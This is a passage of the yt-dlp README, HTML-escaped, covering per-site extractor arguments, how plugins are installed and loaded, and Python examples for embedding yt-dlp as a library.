 &lt;li&gt;&lt;code&gt;jitless&lt;/code&gt;: Run supported Javascript engines in JIT-less mode. Supported runtimes are &lt;code&gt;deno&lt;/code&gt;, &lt;code&gt;node&lt;/code&gt; and &lt;code&gt;bun&lt;/code&gt;. Provides better security at the cost of performance/speed. Do note that &lt;code&gt;node&lt;/code&gt; and &lt;code&gt;bun&lt;/code&gt; are still considered insecure. Either &lt;code&gt;true&lt;/code&gt; or &lt;code&gt;false&lt;/code&gt; (default)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;youtubepot-webpo&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;bind_to_visitor_id&lt;/code&gt;: Whether to use the Visitor ID instead of Visitor Data for caching WebPO tokens. Either &lt;code&gt;true&lt;/code&gt; (default) or &lt;code&gt;false&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;youtubetab (YouTube playlists, channels, feeds, etc.)&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;skip&lt;/code&gt;: One or more of &lt;code&gt;webpage&lt;/code&gt; (skip initial webpage download), &lt;code&gt;authcheck&lt;/code&gt; (allow the download of playlists requiring authentication when no initial webpage is downloaded. This may cause unwanted behavior, see &lt;a href="https://github.com/yt-dlp/yt-dlp/pull/1122"&gt;#1122&lt;/a&gt; for more details)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;approximate_date&lt;/code&gt;: Extract approximate &lt;code&gt;upload_date&lt;/code&gt; and &lt;code&gt;timestamp&lt;/code&gt; in flat-playlist. This may cause date-based filters to be slightly off&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;generic&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;fragment_query&lt;/code&gt;: Passthrough any query in mpd/m3u8 manifest URLs to their fragments if no value is provided, or else apply the query string given as &lt;code&gt;fragment_query=VALUE&lt;/code&gt;. Note that if the stream has an HLS AES-128 key, then the query parameters will be passed to the key URI as well, unless the &lt;code&gt;key_query&lt;/code&gt; extractor-arg is passed, or unless an external key URI is provided via the &lt;code&gt;hls_key&lt;/code&gt; extractor-arg. Does not apply to ffmpeg&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;variant_query&lt;/code&gt;: Passthrough the master m3u8 URL query to its variant playlist URLs if no value is provided, or else apply the query string given as &lt;code&gt;variant_query=VALUE&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;key_query&lt;/code&gt;: Passthrough the master m3u8 URL query to its HLS AES-128 decryption key URI if no value is provided, or else apply the query string given as &lt;code&gt;key_query=VALUE&lt;/code&gt;. Note that this will have no effect if the key URI is provided via the &lt;code&gt;hls_key&lt;/code&gt; extractor-arg. Does not apply to ffmpeg&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;hls_key&lt;/code&gt;: An HLS AES-128 key URI &lt;em&gt;or&lt;/em&gt; key (as hex), and optionally the IV (as hex), in the form of &lt;code&gt;(URI|KEY)[,IV]&lt;/code&gt;; e.g. &lt;code&gt;generic:hls_key=ABCDEF1234567980,0xFEDCBA0987654321&lt;/code&gt;. Passing any of these values will force usage of the native HLS downloader and override the corresponding values found in the m3u8 playlist&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;is_live&lt;/code&gt;: Bypass live HLS detection and manually set &lt;code&gt;live_status&lt;/code&gt; - a value of &lt;code&gt;false&lt;/code&gt; will set &lt;code&gt;not_live&lt;/code&gt;, any other value (or no value) will set &lt;code&gt;is_live&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;impersonate&lt;/code&gt;: Target(s) to try and impersonate with the initial webpage request; e.g. &lt;code&gt;generic:impersonate=safari,chrome-110&lt;/code&gt;. Use &lt;code&gt;generic:impersonate&lt;/code&gt; to impersonate any available target, and use &lt;code&gt;generic:impersonate=false&lt;/code&gt; to disable impersonation (default)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;vikichannel&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;video_types&lt;/code&gt;: Types of videos to download - one or more of &lt;code&gt;episodes&lt;/code&gt;, &lt;code&gt;movies&lt;/code&gt;, &lt;code&gt;clips&lt;/code&gt;, &lt;code&gt;trailers&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;youtubewebarchive&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;check_all&lt;/code&gt;: Try to check more at the cost of more requests. One or more of &lt;code&gt;thumbnails&lt;/code&gt;, &lt;code&gt;captures&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;gamejolt&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;comment_sort&lt;/code&gt;: &lt;code&gt;hot&lt;/code&gt; (default), &lt;code&gt;you&lt;/code&gt; (cookies needed), &lt;code&gt;top&lt;/code&gt;, &lt;code&gt;new&lt;/code&gt; - choose comment sorting mode (on GameJolt's side)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;hotstar&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;res&lt;/code&gt;: resolution to ignore - one or more of &lt;code&gt;sd&lt;/code&gt;, &lt;code&gt;hd&lt;/code&gt;, &lt;code&gt;fhd&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;vcodec&lt;/code&gt;: vcodec to ignore - one or more of &lt;code&gt;h264&lt;/code&gt;, &lt;code&gt;h265&lt;/code&gt;, &lt;code&gt;dvh265&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;dr&lt;/code&gt;: dynamic range to ignore - one or more of &lt;code&gt;sdr&lt;/code&gt;, &lt;code&gt;hdr10&lt;/code&gt;, &lt;code&gt;dv&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;instagram&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;app_id&lt;/code&gt;: The value of the &lt;code&gt;X-IG-App-ID&lt;/code&gt; header used for API requests. Default is the web app ID, &lt;code&gt;936619743392459&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;niconicochannelplus&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;max_comments&lt;/code&gt;: Maximum number of comments to extract - default is &lt;code&gt;120&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;tiktok&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;api_hostname&lt;/code&gt;: Hostname to use for mobile API calls, e.g. &lt;code&gt;api22-normal-c-alisg.tiktokv.com&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;app_name&lt;/code&gt;: Default app name to use with mobile API calls, e.g. &lt;code&gt;trill&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;app_version&lt;/code&gt;: Default app version to use with mobile API calls - should be set along with &lt;code&gt;manifest_app_version&lt;/code&gt;, e.g. &lt;code&gt;34.1.2&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;manifest_app_version&lt;/code&gt;: Default numeric app version to use with mobile API calls, e.g. &lt;code&gt;2023401020&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;aid&lt;/code&gt;: Default app ID to use with mobile API calls, e.g. &lt;code&gt;1180&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;app_info&lt;/code&gt;: Enable mobile API extraction with one or more app info strings in the format of &lt;code&gt;&amp;lt;iid&amp;gt;/[app_name]/[app_version]/[manifest_app_version]/[aid]&lt;/code&gt;, where &lt;code&gt;iid&lt;/code&gt; is the unique app install ID. &lt;code&gt;iid&lt;/code&gt; is the only required value; all other values and their &lt;code&gt;/&lt;/code&gt; separators can be omitted, e.g. &lt;code&gt;tiktok:app_info=1234567890123456789&lt;/code&gt; or &lt;code&gt;tiktok:app_info=123,456/trill///1180,789//34.0.1/340001&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;device_id&lt;/code&gt;: Enable mobile API extraction with a genuine device ID to be used with mobile API calls. Default is a random 19-digit string&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;rokfinchannel&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;tab&lt;/code&gt;: Which tab to download - one of &lt;code&gt;new&lt;/code&gt;, &lt;code&gt;top&lt;/code&gt;, &lt;code&gt;videos&lt;/code&gt;, &lt;code&gt;podcasts&lt;/code&gt;, &lt;code&gt;streams&lt;/code&gt;, &lt;code&gt;stacks&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;twitter&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;api&lt;/code&gt;: Select one of &lt;code&gt;graphql&lt;/code&gt; (default), &lt;code&gt;legacy&lt;/code&gt; or &lt;code&gt;syndication&lt;/code&gt; as the API for tweet extraction. Has no effect if logged in&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;stacommu, wrestleuniverse&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;device_id&lt;/code&gt;: UUID value assigned by the website and used to enforce device limits for paid livestream content. Can be found in browser local storage&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;twitch&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;client_id&lt;/code&gt;: Client ID value to be sent with GraphQL requests, e.g. &lt;code&gt;twitch:client_id=kimne78kx3ncx6brgo4mv6wki5h1ko&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;nhkradirulive (NHK „Çâ„Åò„Çã‚òÖ„Çâ„Åò„Çã LIVE)&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;area&lt;/code&gt;: Which regional variation to extract. Valid areas are: &lt;code&gt;sapporo&lt;/code&gt;, &lt;code&gt;sendai&lt;/code&gt;, &lt;code&gt;tokyo&lt;/code&gt;, &lt;code&gt;nagoya&lt;/code&gt;, &lt;code&gt;osaka&lt;/code&gt;, &lt;code&gt;hiroshima&lt;/code&gt;, &lt;code&gt;matsuyama&lt;/code&gt;, &lt;code&gt;fukuoka&lt;/code&gt;. Defaults to &lt;code&gt;tokyo&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;nflplusreplay&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;type&lt;/code&gt;: Type(s) of game replays to extract. Valid types are: &lt;code&gt;full_game&lt;/code&gt;, &lt;code&gt;full_game_spanish&lt;/code&gt;, &lt;code&gt;condensed_game&lt;/code&gt; and &lt;code&gt;all_22&lt;/code&gt;. You can use &lt;code&gt;all&lt;/code&gt; to extract all available replay types, which is the default&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;jiocinema&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;refresh_token&lt;/code&gt;: The &lt;code&gt;refreshToken&lt;/code&gt; UUID from browser local storage can be passed to extend the life of your login session when logging in with &lt;code&gt;token&lt;/code&gt; as username and the &lt;code&gt;accessToken&lt;/code&gt; from browser local storage as password&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;jiosaavn&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;bitrate&lt;/code&gt;: Audio bitrates to request. One or more of &lt;code&gt;16&lt;/code&gt;, &lt;code&gt;32&lt;/code&gt;, &lt;code&gt;64&lt;/code&gt;, &lt;code&gt;128&lt;/code&gt;, &lt;code&gt;320&lt;/code&gt;. Default is &lt;code&gt;128,320&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;afreecatvlive&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;cdn&lt;/code&gt;: One or more CDN IDs to use with the API call for stream URLs, e.g. &lt;code&gt;gcp_cdn&lt;/code&gt;, &lt;code&gt;gs_cdn_pc_app&lt;/code&gt;, &lt;code&gt;gs_cdn_mobile_web&lt;/code&gt;, &lt;code&gt;gs_cdn_pc_web&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;soundcloud&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;formats&lt;/code&gt;: Formats to request from the API. Requested values should be in the format of &lt;code&gt;{protocol}_{codec}&lt;/code&gt;, e.g. &lt;code&gt;hls_opus,http_aac&lt;/code&gt;. The &lt;code&gt;*&lt;/code&gt; character functions as a wildcard, e.g. &lt;code&gt;*_mp3&lt;/code&gt;, and can be passed by itself to request all formats. Known protocols include &lt;code&gt;http&lt;/code&gt;, &lt;code&gt;hls&lt;/code&gt; and &lt;code&gt;hls-aes&lt;/code&gt;; known codecs include &lt;code&gt;aac&lt;/code&gt;, &lt;code&gt;opus&lt;/code&gt; and &lt;code&gt;mp3&lt;/code&gt;. Original &lt;code&gt;download&lt;/code&gt; formats are always extracted. Default is &lt;code&gt;http_aac,hls_aac,http_opus,hls_opus,http_mp3,hls_mp3&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;orfon (orf:on)&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;prefer_segments_playlist&lt;/code&gt;: Prefer a playlist of program segments instead of a single complete video when available. If individual segments are desired, use &lt;code&gt;--concat-playlist never --extractor-args "orfon:prefer_segments_playlist"&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;bilibili&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;prefer_multi_flv&lt;/code&gt;: Prefer extracting flv formats over mp4 for older videos that still provide legacy formats&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;sonylivseries&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;sort_order&lt;/code&gt;: Episode sort order for series extraction - one of &lt;code&gt;asc&lt;/code&gt; (ascending, oldest first) or &lt;code&gt;desc&lt;/code&gt; (descending, newest first). Default is &lt;code&gt;asc&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;tver&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;backend&lt;/code&gt;: Backend API to use for extraction - one of &lt;code&gt;streaks&lt;/code&gt; (default) or &lt;code&gt;brightcove&lt;/code&gt; (deprecated)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;vimeo&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;client&lt;/code&gt;: Client to extract video data from. The currently available clients are &lt;code&gt;android&lt;/code&gt;, &lt;code&gt;ios&lt;/code&gt;, &lt;code&gt;macos&lt;/code&gt; and &lt;code&gt;web&lt;/code&gt;. Only one client can be used. The &lt;code&gt;macos&lt;/code&gt; client is used by default, but the &lt;code&gt;web&lt;/code&gt; client is used when logged-in. The &lt;code&gt;web&lt;/code&gt; client only works with account cookies or login credentials. The &lt;code&gt;android&lt;/code&gt; and &lt;code&gt;ios&lt;/code&gt; clients only work with previously cached OAuth tokens&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;original_format_policy&lt;/code&gt;: Policy for when to try extracting original formats. One of &lt;code&gt;always&lt;/code&gt;, &lt;code&gt;never&lt;/code&gt;, or &lt;code&gt;auto&lt;/code&gt;. The default &lt;code&gt;auto&lt;/code&gt; policy tries to avoid exceeding the web client's API rate-limit by only making an extra request when Vimeo publicizes the video's downloadability&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: These options may be changed/removed in the future without concern for backward compatibility&lt;/p&gt; 
&lt;!-- MANPAGE: MOVE "INSTALLATION" SECTION HERE --&gt; 
&lt;h1&gt;PLUGINS&lt;/h1&gt; 
&lt;p&gt;Note that &lt;strong&gt;all&lt;/strong&gt; plugins are imported even if not invoked, and that &lt;strong&gt;there are no checks&lt;/strong&gt; performed on plugin code. &lt;strong&gt;Use plugins at your own risk and only if you trust the code!&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Plugins can be of &lt;code&gt;&amp;lt;type&amp;gt;&lt;/code&gt;s &lt;code&gt;extractor&lt;/code&gt; or &lt;code&gt;postprocessor&lt;/code&gt;.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Extractor plugins do not need to be enabled from the CLI and are automatically invoked when the input URL is suitable for it.&lt;/li&gt; 
 &lt;li&gt;Extractor plugins take priority over built-in extractors.&lt;/li&gt; 
 &lt;li&gt;Postprocessor plugins can be invoked using &lt;code&gt;--use-postprocessor NAME&lt;/code&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Plugins are loaded from the namespace packages &lt;code&gt;yt_dlp_plugins.extractor&lt;/code&gt; and &lt;code&gt;yt_dlp_plugins.postprocessor&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;In other words, the file structure on the disk looks something like:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;    yt_dlp_plugins/
        extractor/
            myplugin.py
        postprocessor/
            myplugin.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;yt-dlp looks for these &lt;code&gt;yt_dlp_plugins&lt;/code&gt; namespace folders in many locations (see below) and loads in plugins from &lt;strong&gt;all&lt;/strong&gt; of them. Set the environment variable &lt;code&gt;YTDLP_NO_PLUGINS&lt;/code&gt; to something nonempty to disable loading plugins entirely.&lt;/p&gt; 
&lt;p&gt;See the &lt;a href="https://github.com/yt-dlp/yt-dlp/wiki/Plugins"&gt;wiki for some known plugins&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Installing Plugins&lt;/h2&gt; 
&lt;p&gt;Plugins can be installed using various methods and locations.&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Configuration directories&lt;/strong&gt;: Plugin packages (containing a &lt;code&gt;yt_dlp_plugins&lt;/code&gt; namespace folder) can be dropped into the following standard &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#configuration"&gt;configuration locations&lt;/a&gt;:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;User Plugins&lt;/strong&gt; 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;${XDG_CONFIG_HOME}/yt-dlp/plugins/&amp;lt;package name&amp;gt;/yt_dlp_plugins/&lt;/code&gt; (recommended on Linux/macOS)&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;${XDG_CONFIG_HOME}/yt-dlp-plugins/&amp;lt;package name&amp;gt;/yt_dlp_plugins/&lt;/code&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;${APPDATA}/yt-dlp/plugins/&amp;lt;package name&amp;gt;/yt_dlp_plugins/&lt;/code&gt; (recommended on Windows)&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;${APPDATA}/yt-dlp-plugins/&amp;lt;package name&amp;gt;/yt_dlp_plugins/&lt;/code&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;~/.yt-dlp/plugins/&amp;lt;package name&amp;gt;/yt_dlp_plugins/&lt;/code&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;~/yt-dlp-plugins/&amp;lt;package name&amp;gt;/yt_dlp_plugins/&lt;/code&gt;&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;strong&gt;System Plugins&lt;/strong&gt; 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;/etc/yt-dlp/plugins/&amp;lt;package name&amp;gt;/yt_dlp_plugins/&lt;/code&gt;&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;/etc/yt-dlp-plugins/&amp;lt;package name&amp;gt;/yt_dlp_plugins/&lt;/code&gt;&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Executable location&lt;/strong&gt;: Plugin packages can similarly be installed in a &lt;code&gt;yt-dlp-plugins&lt;/code&gt; directory under the executable location (recommended for portable installations):&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Binary: where &lt;code&gt;&amp;lt;root-dir&amp;gt;/yt-dlp.exe&lt;/code&gt;, &lt;code&gt;&amp;lt;root-dir&amp;gt;/yt-dlp-plugins/&amp;lt;package name&amp;gt;/yt_dlp_plugins/&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;Source: where &lt;code&gt;&amp;lt;root-dir&amp;gt;/yt_dlp/__main__.py&lt;/code&gt;, &lt;code&gt;&amp;lt;root-dir&amp;gt;/yt-dlp-plugins/&amp;lt;package name&amp;gt;/yt_dlp_plugins/&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;pip and other locations in &lt;code&gt;PYTHONPATH&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Plugin packages can be installed and managed using &lt;code&gt;pip&lt;/code&gt;. See &lt;a href="https://github.com/yt-dlp/yt-dlp-sample-plugins"&gt;yt-dlp-sample-plugins&lt;/a&gt; for an example. 
    &lt;ul&gt; 
     &lt;li&gt;Note: plugin files between plugin packages installed with pip must have unique filenames.&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;Any path in &lt;code&gt;PYTHONPATH&lt;/code&gt; is searched in for the &lt;code&gt;yt_dlp_plugins&lt;/code&gt; namespace folder. 
    &lt;ul&gt; 
     &lt;li&gt;Note: This does not apply for Pyinstaller builds.&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;code&gt;.zip&lt;/code&gt;, &lt;code&gt;.egg&lt;/code&gt; and &lt;code&gt;.whl&lt;/code&gt; archives containing a &lt;code&gt;yt_dlp_plugins&lt;/code&gt; namespace folder in their root are also supported as plugin packages.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;e.g. &lt;code&gt;${XDG_CONFIG_HOME}/yt-dlp/plugins/mypluginpkg.zip&lt;/code&gt; where &lt;code&gt;mypluginpkg.zip&lt;/code&gt; contains &lt;code&gt;yt_dlp_plugins/&amp;lt;type&amp;gt;/myplugin.py&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Run yt-dlp with &lt;code&gt;--verbose&lt;/code&gt; to check if the plugin has been loaded.&lt;/p&gt; 
&lt;h2&gt;Developing Plugins&lt;/h2&gt; 
&lt;p&gt;See the &lt;a href="https://github.com/yt-dlp/yt-dlp-sample-plugins"&gt;yt-dlp-sample-plugins&lt;/a&gt; repo for a template plugin package and the &lt;a href="https://github.com/yt-dlp/yt-dlp/wiki/Plugin-Development"&gt;Plugin Development&lt;/a&gt; section of the wiki for a plugin development guide.&lt;/p&gt; 
&lt;p&gt;All public classes with a name ending in &lt;code&gt;IE&lt;/code&gt;/&lt;code&gt;PP&lt;/code&gt; are imported from each file for extractors and postprocessors respectively. This respects underscore prefix (e.g. &lt;code&gt;_MyBasePluginIE&lt;/code&gt; is private) and &lt;code&gt;__all__&lt;/code&gt;. Modules can similarly be excluded by prefixing the module name with an underscore (e.g. &lt;code&gt;_myplugin.py&lt;/code&gt;).&lt;/p&gt; 
&lt;p&gt;To replace an existing extractor with a subclass of one, set the &lt;code&gt;plugin_name&lt;/code&gt; class keyword argument (e.g. &lt;code&gt;class MyPluginIE(ABuiltInIE, plugin_name='myplugin')&lt;/code&gt; will replace &lt;code&gt;ABuiltInIE&lt;/code&gt; with &lt;code&gt;MyPluginIE&lt;/code&gt;). Since the extractor replaces the parent, you should exclude the subclass extractor from being imported separately by making it private using one of the methods described above.&lt;/p&gt; 
&lt;p&gt;If you are a plugin author, add &lt;a href="https://github.com/topics/yt-dlp-plugins"&gt;yt-dlp-plugins&lt;/a&gt; as a topic to your repository for discoverability.&lt;/p&gt; 
&lt;p&gt;See the &lt;a href="https://github.com/yt-dlp/yt-dlp/raw/master/CONTRIBUTING.md#developer-instructions"&gt;Developer Instructions&lt;/a&gt; on how to write and test an extractor.&lt;/p&gt; 
&lt;h1&gt;EMBEDDING YT-DLP&lt;/h1&gt; 
&lt;p&gt;yt-dlp makes the best effort to be a good command-line program, and thus should be callable from any programming language.&lt;/p&gt; 
&lt;p&gt;Your program should avoid parsing the normal stdout since they may change in future versions. Instead, they should use options such as &lt;code&gt;-J&lt;/code&gt;, &lt;code&gt;--print&lt;/code&gt;, &lt;code&gt;--progress-template&lt;/code&gt;, &lt;code&gt;--exec&lt;/code&gt; etc to create console output that you can reliably reproduce and parse.&lt;/p&gt; 
&lt;p&gt;From a Python program, you can embed yt-dlp in a more powerful fashion, like this:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from yt_dlp import YoutubeDL

URLS = ['https://www.youtube.com/watch?v=BaW_jenozKc']
with YoutubeDL() as ydl:
    ydl.download(URLS)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Most likely, you'll want to use various options. For a list of options available, have a look at &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/yt_dlp/YoutubeDL.py#L183"&gt;&lt;code&gt;yt_dlp/YoutubeDL.py&lt;/code&gt;&lt;/a&gt; or &lt;code&gt;help(yt_dlp.YoutubeDL)&lt;/code&gt; in a Python shell. If you are already familiar with the CLI, you can use &lt;a href="https://github.com/yt-dlp/yt-dlp/raw/master/devscripts/cli_to_api.py"&gt;&lt;code&gt;devscripts/cli_to_api.py&lt;/code&gt;&lt;/a&gt; to translate any CLI switches to &lt;code&gt;YoutubeDL&lt;/code&gt; params.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Tip&lt;/strong&gt;: If you are porting your code from youtube-dl to yt-dlp, one important point to look out for is that we do not guarantee the return value of &lt;code&gt;YoutubeDL.extract_info&lt;/code&gt; to be json serializable, or even be a dictionary. It will be dictionary-like, but if you want to ensure it is a serializable dictionary, pass it through &lt;code&gt;YoutubeDL.sanitize_info&lt;/code&gt; as shown in the &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#extracting-information"&gt;example below&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Embedding examples&lt;/h2&gt; 
&lt;h4&gt;Extracting information&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;import json
import yt_dlp

URL = 'https://www.youtube.com/watch?v=BaW_jenozKc'

# ‚ÑπÔ∏è See help(yt_dlp.YoutubeDL) for a list of available options and public functions
ydl_opts = {}
with yt_dlp.YoutubeDL(ydl_opts) as ydl:
    info = ydl.extract_info(URL, download=False)

    # ‚ÑπÔ∏è ydl.sanitize_info makes the info json-serializable
    print(json.dumps(ydl.sanitize_info(info)))
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Download using an info-json&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;import yt_dlp

INFO_FILE = 'path/to/video.info.json'

with yt_dlp.YoutubeDL() as ydl:
    error_code = ydl.download_with_info_file(INFO_FILE)

print('Some videos failed to download' if error_code
      else 'All videos successfully downloaded')
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Extract audio&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;import yt_dlp

URLS = ['https://www.youtube.com/watch?v=BaW_jenozKc']

ydl_opts = {
    'format': 'm4a/bestaudio/best',
    # ‚ÑπÔ∏è See help(yt_dlp.postprocessor) for a list of available Postprocessors and their arguments
    'postprocessors': [{  # Extract audio using ffmpeg
        'key': 'FFmpegExtractAudio',
        'preferredcodec': 'm4a',
    }]
}

with yt_dlp.YoutubeDL(ydl_opts) as ydl:
    error_code = ydl.download(URLS)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Filter videos&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;import yt_dlp

URLS = ['https://www.youtube.com/watch?v=BaW_jenozKc']

def longer_than_a_minute(info, *, incomplete):
    """Download only videos longer than a minute (or with unknown duration)"""
    duration = info.get('duration')
    if duration and duration &amp;lt; 60:
        return 'The video is too short'

ydl_opts = {
    'match_filter': longer_than_a_minute,
}

with yt_dlp.YoutubeDL(ydl_opts) as ydl:
    error_code = ydl.download(URLS)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Adding logger and progress hook&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;import yt_dlp

URLS = ['https://www.youtube.com/watch?v=BaW_jenozKc']

class MyLogger:
    def debug(self, msg):
        # For compatibility with youtube-dl, both debug and info are passed into debug
        # You can distinguish them by the prefix '[debug] '
        if msg.startswith('[debug] '):
            pass
        else:
            self.info(msg)

    def info(self, msg):
        pass

    def warning(self, msg):
        pass

    def error(self, msg):
        print(msg)


# ‚ÑπÔ∏è See "progress_hooks" in help(yt_dlp.YoutubeDL)
def my_hook(d):
    if d['status'] == 'finished':
        print('Done downloading, now post-processing ...')


ydl_opts = {
    'logger': MyLogger(),
    'progress_hooks': [my_hook],
}

with yt_dlp.YoutubeDL(ydl_opts) as ydl:
    ydl.download(URLS)
